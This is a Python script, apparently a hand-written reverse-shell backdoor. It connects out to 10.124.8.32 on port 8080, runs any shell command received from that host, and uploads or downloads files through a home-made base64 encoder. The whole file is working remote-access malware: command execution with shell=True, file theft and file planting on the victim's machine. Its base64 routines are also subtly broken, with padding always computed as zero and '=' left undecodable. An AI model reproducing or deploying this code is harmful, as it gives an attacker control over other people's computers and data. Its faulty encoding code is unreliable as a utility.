import socket
import subprocess
import simplejson
import os

def image_to_base64(image_path):
    with open(image_path, "rb") as image_file:
        image_data = image_file.read()
        encoded_string = encode_base64(image_data)
        return encoded_string

def base64_to_image(encoded_string, output_path):
    decoded_data = decode_base64(encoded_string)
    with open(output_path, "wb") as image_file:
        image_file.write(decoded_data)

def encode_base64(data):
    base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    base64_string = ""
    padding = 0

    for i in range(0, len(data), 3):
        chunk = (data[i] << 16) + ((data[i + 1] if i + 1 < len(data) else 0) << 8) + (data[i + 2] if i + 2 < len(data) else 0)

        for j in range(4):
            index = (chunk >> ((3 - j) * 6)) & 0x3F
            base64_string += base64_chars[index]

        padding = (padding + 3) % 3

    return base64_string + ("=" * padding)

def decode_base64(base64_string):
    base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    decoded_data = bytearray()

    for i in range(0, len(base64_string), 4):
        chunk = 0
        for j in range(4):
            chunk = (chunk << 6) + base64_chars.index(base64_string[i + j])

        decoded_data.extend([
            (chunk >> 16) & 0xFF,
            (chunk >> 8) & 0xFF,
            chunk & 0xFF
        ])

    return bytes(decoded_data)

# # Your image file paths
# input_image_path = 'input_image.png'
# output_image_path = 'output_image.png'

# # Read the image and convert it to Base64
# with open(input_image_path, "rb") as image_file:
#     image_data = image_file.read()
#     encoded_image = encode_base64(image_data)
#     print("Image Encrypted to Base64:")
#     print(encoded_image)

# # Convert Base64 back to image
# decoded_image = decode_base64(encoded_image)
# with open(output_image_path, "wb") as output_image_file:
#     output_image_file.write(decoded_image)
#     print("Image Decrypted from Base64.")


class MySocket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))
        
    def command_execution(self, command):
        return subprocess.check_output(command, shell=True)
    
    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))
        
    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
            
    def execute_cd_command(self, directory):
        os.chdir(directory)
        return "cd to " + directory
    
    def save_file(self, path, content):
        with open(path, "wb") as my_file:
            my_file.write(decode_base64(content))
            return "Download OK"
        
    def get_file_content(self, path):
        with open(path, "rb") as my_file:
            return encode_base64(my_file.read())
    
    def start_socket(self):
        while True:
            command = self.json_receive()
            try:
                if command[0] == "quit":
                    self.my_connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_optput = self.execute_cd_command(command[1])
                elif command[0] == "download":
                    command_optput = self.get_file_content(command[1])
                elif command[0] == "upload":
                    command_optput = self.save_file(command[1], command[2])
                elif command[0] == "pwd":
                    command_optput = os.getcwd()
                elif command[0] == "ls":
                    command_optput = os.listdir()
                else:
                    command_optput = self.command_execution(command)
            except Exception:
                command_optput = "Error!"
            self.json_send(command_optput)
            
        self.my_connection.close()
        
my_socket_object = MySocket("10.124.8.32", 8080)
my_socket_object.start_socket()